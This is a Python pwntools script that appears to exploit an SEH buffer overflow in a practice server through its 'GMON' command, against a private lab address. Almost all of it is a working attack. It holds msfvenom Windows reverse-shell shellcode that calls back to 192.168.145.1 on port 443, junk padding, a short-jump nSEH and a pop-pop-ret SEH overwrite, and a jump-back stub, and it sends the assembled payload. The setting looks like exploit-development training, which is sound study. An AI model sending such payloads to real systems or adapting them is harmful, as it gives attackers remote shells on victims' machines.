#!/usr/bin/python3

from pwn import *

# target info
host = "192.168.145.129"
port = 9999
s = remote(host, port)

# phase 1: test offset
vulncmd = b"GMON /.:/"
crash = 4000

# msfvenom -p windows/shell_reverse_tcp -b "\x00" LHOST=192.168.145.1 LPORT=443  -f hex EXINTFUNC=thread 
# this way produces a neater script
shellcode = binascii.unhexlify("be3c463867dacdd97424f45d29c9b15283c50431750e034948da924dbc985dad3dfdd4480c3d82193f8dc04fcc66847b470a018ce0a177a3f19a44a271e198044b2aed458c571c174513b387e269082cb87c08d1097e394401d99967c651907f0b5f6af4ff2b6ddc31d3c221fe261a6639d9699e39646a6543b2ff7de331a75915953e2a195234743e65990f3aee1cdfcab43afb976f225a72c15bbcddbef9b7f0ab739a9c18be245d37c9576f9861ffc351acf824480896da7369bf182739d78948d227359d7577994e3627593fde2d5660fe4ebc0995b557f6c224a69e1046a8e59ca0c009c97b7db350f71c3c4f721eb67c83d13f089786cf47c501cf7d61cd421a71987eb526cdb1cca2e3e866d0f96d4050264e4f59abea6b4975f2373d29a5e1eb8f1f404546f30a011f3f8d57206a7bb791c33ac81e84cab142343468c7447f306ecd26a13290d81c70ad5a94094a42dd0c16c40e7d07a130d228e0")

# this is the common way
# msfvenom -p windows/shell_reverse_tcp -b "\x00" lhost=192.168.145.1 lport=443 -f py EXINTFUNC=thread -v shellcode
# shellcode =  b""
# shellcode += b"\xdd\xc6\xd9\x74\x24\xf4\x5e\xbf\x38\xcc\x63"
# shellcode += b"\xa1\x29\xc9\xb1\x52\x31\x7e\x17\x03\x7e\x17"
# shellcode += b"\x83\xd6\x30\x81\x54\xda\x21\xc4\x97\x22\xb2"
# shellcode += b"\xa9\x1e\xc7\x83\xe9\x45\x8c\xb4\xd9\x0e\xc0"
# shellcode += b"\x38\x91\x43\xf0\xcb\xd7\x4b\xf7\x7c\x5d\xaa"
# shellcode += b"\x36\x7c\xce\x8e\x59\xfe\x0d\xc3\xb9\x3f\xde"
# shellcode += b"\x16\xb8\x78\x03\xda\xe8\xd1\x4f\x49\x1c\x55"
# shellcode += b"\x05\x52\x97\x25\x8b\xd2\x44\xfd\xaa\xf3\xdb"
# shellcode += b"\x75\xf5\xd3\xda\x5a\x8d\x5d\xc4\xbf\xa8\x14"
# shellcode += b"\x7f\x0b\x46\xa7\xa9\x45\xa7\x04\x94\x69\x5a"
# shellcode += b"\x54\xd1\x4e\x85\x23\x2b\xad\x38\x34\xe8\xcf"
# shellcode += b"\xe6\xb1\xea\x68\x6c\x61\xd6\x89\xa1\xf4\x9d"
# shellcode += b"\x86\x0e\x72\xf9\x8a\x91\x57\x72\xb6\x1a\x56"
# shellcode += b"\x54\x3e\x58\x7d\x70\x1a\x3a\x1c\x21\xc6\xed"
# shellcode += b"\x21\x31\xa9\x52\x84\x3a\x44\x86\xb5\x61\x01"
# shellcode += b"\x6b\xf4\x99\xd1\xe3\x8f\xea\xe3\xac\x3b\x64"
# shellcode += b"\x48\x24\xe2\x73\xaf\x1f\x52\xeb\x4e\xa0\xa3"
# shellcode += b"\x22\x95\xf4\xf3\x5c\x3c\x75\x98\x9c\xc1\xa0"
# shellcode += b"\x0f\xcc\x6d\x1b\xf0\xbc\xcd\xcb\x98\xd6\xc1"
# shellcode += b"\x34\xb8\xd9\x0b\x5d\x53\x20\xdc\xa2\x0c\xbb"
# shellcode += b"\x1d\x4b\x4f\xbb\x1c\x30\xc6\x5d\x74\x56\x8f"
# shellcode += b"\xf6\xe1\xcf\x8a\x8c\x90\x10\x01\xe9\x93\x9b"
# shellcode += b"\xa6\x0e\x5d\x6c\xc2\x1c\x0a\x9c\x99\x7e\x9d"
# shellcode += b"\xa3\x37\x16\x41\x31\xdc\xe6\x0c\x2a\x4b\xb1"
# shellcode += b"\x59\x9c\x82\x57\x74\x87\x3c\x45\x85\x51\x06"
# shellcode += b"\xcd\x52\xa2\x89\xcc\x17\x9e\xad\xde\xe1\x1f"
# shellcode += b"\xea\x8a\xbd\x49\xa4\x64\x78\x20\x06\xde\xd2"
# shellcode += b"\x9f\xc0\xb6\xa3\xd3\xd2\xc0\xab\x39\xa5\x2c"
# shellcode += b"\x1d\x94\xf0\x53\x92\x70\xf5\x2c\xce\xe0\xfa"
# shellcode += b"\xe7\x4a\x10\xb1\xa5\xfb\xb9\x1c\x3c\xbe\xa7"
# shellcode += b"\x9e\xeb\xfd\xd1\x1c\x19\x7e\x26\x3c\x68\x7b"
# shellcode += b"\x62\xfa\x81\xf1\xfb\x6f\xa5\xa6\xfc\xa5"

junk = b"A" * (3515 - len(shellcode))
jumpback = asm("push esp; pop eax; add ax, 0x565; jmp eax;") # b'TXf\x05e\x05\xff\xe0'
#jumpback = b"\x54\x58\x66\x05\x65\x05\xff\xe0" # manual hand encoding from nasmshell - also working


nseh = p32(0x09eb9090)  # 2x noops, then jump 9 bytes to the next A (eb means JMP SHORT)
seh = p32(0x625010b4)  # pop pop ret


#cyclic_pattern = cyclic_metasploit(6000)

payload = b"".join([
    vulncmd,
    shellcode,
    junk,
    nseh,
    seh,
    b"\x90"*5,
    jumpback
    
])

payload += b"X" * (crash - len(payload))  # padding

print("[+] Sending payload..")
s.send(payload)
print("[+] Payload sent!")
s.close()